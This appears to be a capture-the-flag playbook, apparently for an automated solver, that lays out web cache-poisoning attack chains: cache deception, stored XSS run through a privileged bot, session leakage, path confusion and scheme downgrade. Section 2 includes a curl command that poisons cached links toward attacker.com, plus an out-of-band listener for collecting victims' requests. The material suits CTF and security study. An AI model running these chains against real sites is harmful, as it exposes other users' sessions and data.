# Multi-step chains — the cache-poisoning chains, end to end

The chained attacks — a deception + an injection + a privileged context.

---

## 1. The authenticated-deception chain — the verified card's shape

```text
an authenticated page cached under a shared URL → the stored copy
serves the privileged content to the anonymous → a charset XSS stored
in the page → the privileged bot's XSS writes files → the marshal RCE
→ the flag.
```

## 2. The host-rewrite-exfil chain — the URL-rewrite leak

```text
an unkeyed X-Forwarded-Host → the app's links point to YOUR domain →
the stored copy's scripts/links fetch YOUR domain → the requester's
fetch leaks to YOUR listener.
```

```bash
curl "$BASE/page?cb=<unique>" -H 'X-Forwarded-Host: attacker.com'
# the stored copy's links/scripts point to attacker.com — every requester's fetch hits you
python3 tools/web/oob_listener.py serve --port 9000
python3 tools/web/oob_listener.py hits --name c1
```

## 3. The stored-XSS-bot chain — the injected-content render

```text
an unkeyed reflected payload (a JS) → the stored copy carries it →
the privileged bot renders the page → the injected JS runs in the
bot's context → the flag/cookie read.
```

## 4. The personalized-page chain — the session-data leak

```text
a personalized page cached under a shared URL → the stored copy
serves YOUR session's content to every requester → a session-data
leak → the requester's response carries YOUR session.
```

## 5. The path-confusion chain — the route-rewrite deception

```text
a path-normalization boundary → the cache stores a static-looking URL
with the app's dynamic response → the stored copy's URL is the
victim's URL, the response is YOUR request's → a deception.
```

## 6. The scheme-downgrade chain — the http downgrade

```text
an unkeyed X-Forwarded-Scheme → the app's links use http → the stored
copy's links point to http → a downgrade surface.
```

## 7. The multi-vector chain — a combined injection + deception

```text
an unkeyed header + a reflected payload → the stored copy carries
both → the injected content reaches every requester → a combined
injection + deception chain.
```

## 8. The auth-deception-RCE chain — the verified card's full chain

```text
the verified card's full chain:
1. an authenticated page cached under a shared URL — the deception
2. a charset XSS stored in the cached page — the injection
3. the privileged bot's XSS writes files — the RCE
4. a marshal RCE — the flag
```

## 9. The per-chain falsifier — when the chain breaks

```text
a keyed input → a per-input entry → no shared store → a different class.
a 302 to login → the cache didn't serve the privileged page → a
different class.
a MISS reflection → a reflection, not a store → a different class.
no front-end cache → no stored response → a different class.
```

## 10. The per-chain probe map — which chain for which surface

```text
an authenticated + a shared cache → the auth-deception chain
a host-rewrite surface            → the host-rewrite-exfil chain
a reflected payload surface       → the stored-XSS-bot chain
a personalized + a shared cache   → the personalized-page chain
a path-normalization boundary     → the path-confusion chain
a scheme-rewrite surface          → the scheme-downgrade chain
a charset surface                 → the charset-XSS chain
```

## 11. The chain's budget — the probe limits

```text
5 probes or 15 minutes per mechanism class; 25 probes or 45 minutes
for the challenge. a spent budget → escalate: chain_match → reclassify
→ writeup_search → novel_plan → fanout_sweep → solver_handoff.
```

## 12. The chain's ledger — what to record

```bash
python3 tools/state.py <c> --hypothesis \
  "cache-poison-chain: <chain> — input=<unkeyed> — key=<cached-parts> — blast=<shared-url>"
```
